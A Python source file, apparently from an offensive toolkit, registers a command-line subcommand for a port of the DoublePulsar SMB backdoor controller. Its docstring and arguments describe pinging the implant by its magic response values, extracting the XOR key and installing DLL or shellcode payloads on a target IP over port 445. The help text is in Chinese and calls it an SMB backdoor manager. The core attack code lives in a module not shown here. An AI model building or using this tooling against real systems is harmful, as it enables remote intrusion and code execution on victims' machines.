"""doublepulsar — DoublePulsar SMB implant CLI.

Port of Doublepulsar-1.3.1.exe. The analyzed binary exposes Function,
Architecture, Target/Protocol, DLL/shellcode and output parameters; it performs
SMB setup, pings the implant (magic response 0x19293944/0x19293949 family),
extracts architecture/XOR key, and then installs/uninstalls/executes payloads.
"""
from . import doublepulsar


def doublepulsar_handle(args):
    return doublepulsar.run(
        function=args.function, target_ip=args.target_ip, target_port=args.target_port,
        protocol=args.protocol, architecture=args.architecture,
        dll_payload=args.dll_payload, dll_ordinal=args.dll_ordinal,
        process_name=args.process_name, process_command_line=args.process_command_line,
        shellcode_file=args.shellcode_file, output_file=args.output_file,
        output_install=args.output_install, network_timeout=args.network_timeout,
    )


def reg_subparser(subparsers):
    p = subparsers.add_parser("doublepulsar", help="DoublePulsar SMB 后门管理器", description=__doc__)
    p.add_argument("target_ip", help="目标 IP")
    p.add_argument("-f", "--function", choices=["Ping", "Install", "Uninstall", "RunDLL", "RunShellcode", "OutputInstall"], default="Ping")
    p.add_argument("-P", "--target-port", type=int, default=445)
    p.add_argument("--protocol", choices=["SMB", "NBT"], default="SMB")
    p.add_argument("--architecture", choices=["x86", "x64", "auto"], default="auto")
    p.add_argument("--dll-payload")
    p.add_argument("--dll-ordinal", type=int, default=1)
    p.add_argument("--process-name")
    p.add_argument("--process-command-line")
    p.add_argument("--shellcode-file")
    p.add_argument("--output-file")
    p.add_argument("--output-install", action="store_true")
    p.add_argument("--network-timeout", type=float, default=30.0)
    p.set_defaults(func=doublepulsar_handle)